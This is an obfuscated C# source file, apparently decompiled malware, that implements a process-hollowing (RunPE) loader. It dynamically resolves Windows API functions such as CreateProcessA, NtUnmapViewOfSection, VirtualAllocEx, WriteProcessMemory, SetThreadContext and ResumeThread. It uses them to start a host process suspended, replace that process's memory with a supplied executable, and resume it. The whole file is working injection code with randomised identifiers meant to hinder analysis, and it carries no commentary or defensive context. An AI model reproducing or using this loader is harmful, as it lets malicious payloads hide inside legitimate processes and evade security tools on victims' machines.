using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class bFwFROrbrkbYMMnTvQaZszUVbqZcEbbOimUXCEyCgf
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool ToBKhVwRCCkMvCRoJmqsn(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, uint[] Part2);

	public delegate uint IUrteGuLLVlqVOHpy(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl);

	public delegate uint VTVURTUpTkLJywmOyQnzmcmOZpmNsyfjmLZYR(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, IntPtr Part2);

	public delegate IntPtr NOiRQBmLXazimxyDtuVMFESFekfVqpMvVCfeIhYQPbQiwqCxwctdsfZh(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool jLkJSfZFxBvClLzZRiNGQS(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, uint[] Part2);

	public delegate bool aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool MapIczrXFnXCKFrxidHLcEUSmBNu(IntPtr ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool KjOGgEOmGsZliDecERYEGYbntPHxTjXqewUHURwfH(string ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] ujlfTUScKOtllsBxPcpOgwspJFGpzZmzl0);

	private static ToBKhVwRCCkMvCRoJmqsn toBKhVwRCCkMvCRoJmqsn_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<ToBKhVwRCCkMvCRoJmqsn>("kernel32", "SetThreadContext");

	private static IUrteGuLLVlqVOHpy iurteGuLLVlqVOHpy_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<IUrteGuLLVlqVOHpy>("kernel32", "ResumeThread");

	private static VTVURTUpTkLJywmOyQnzmcmOZpmNsyfjmLZYR vtvurtupTkLJywmOyQnzmcmOZpmNsyfjmLZYR_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<VTVURTUpTkLJywmOyQnzmcmOZpmNsyfjmLZYR>("ntdll", "NtUnmapViewOfSection");

	private static NOiRQBmLXazimxyDtuVMFESFekfVqpMvVCfeIhYQPbQiwqCxwctdsfZh noiRQBmLXazimxyDtuVMFESFekfVqpMvVCfeIhYQPbQiwqCxwctdsfZh_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<NOiRQBmLXazimxyDtuVMFESFekfVqpMvVCfeIhYQPbQiwqCxwctdsfZh>("kernel32", "VirtualAllocEx");

	private static jLkJSfZFxBvClLzZRiNGQS jLkJSfZFxBvClLzZRiNGQS_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<jLkJSfZFxBvClLzZRiNGQS>("kernel32", "GetThreadContext");

	private static aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM>("kernel32", "WriteProcessMemory");

	private static MapIczrXFnXCKFrxidHLcEUSmBNu mapIczrXFnXCKFrxidHLcEUSmBNu_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<MapIczrXFnXCKFrxidHLcEUSmBNu>("kernel32", "ReadProcessMemory");

	private static KjOGgEOmGsZliDecERYEGYbntPHxTjXqewUHURwfH kjOGgEOmGsZliDecERYEGYbntPHxTjXqewUHURwfH_0 = bupOinevzMwmIAFzPIIfTUOFiZUh<KjOGgEOmGsZliDecERYEGYbntPHxTjXqewUHURwfH>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T bupOinevzMwmIAFzPIIfTUOFiZUh<T>(string UVefMuN, string FwfKkjyTWxDgUNvHBoUBEhmOcuVPh)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref UVefMuN), ref FwfKkjyTWxDgUNvHBoUBEhmOcuVPh), typeof(T));
	}

	public static bool eSBxcKZnokewJCShLZXKHMwsJTDBIIj(byte[] SvJlXwZxeMczxvZgCzXUy, string SHQdGWmdfrRoOHgUGmgPEIoplxZlMvXd)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(SvJlXwZxeMczxvZgCzXUy, 60);
				int num2 = BitConverter.ToInt16(SvJlXwZxeMczxvZgCzXUy, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(SvJlXwZxeMczxvZgCzXUy, num + 84));
				if (kjOGgEOmGsZliDecERYEGYbntPHxTjXqewUHURwfH_0(null, new StringBuilder(SHQdGWmdfrRoOHgUGmgPEIoplxZlMvXd), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (jLkJSfZFxBvClLzZRiNGQS_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((mapIczrXFnXCKFrxidHLcEUSmBNu_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)vtvurtupTkLJywmOyQnzmcmOZpmNsyfjmLZYR_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(SvJlXwZxeMczxvZgCzXUy, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(SvJlXwZxeMczxvZgCzXUy, num + 80));
							IntPtr part5 = noiRQBmLXazimxyDtuVMFESFekfVqpMvVCfeIhYQPbQiwqCxwctdsfZh_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM_0(array[0], part5, SvJlXwZxeMczxvZgCzXUy, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(SvJlXwZxeMczxvZgCzXUy, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(SvJlXwZxeMczxvZgCzXUy, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							aAxpXOHcbWoaKuNrIUpIfIXjtBKlKAaIuFAbcOUxkjkkjNkoeXgmkM_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(SvJlXwZxeMczxvZgCzXUy, num + 40));
							toBKhVwRCCkMvCRoJmqsn_0(array[1], array2);
						}
					}
					iurteGuLLVlqVOHpy_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
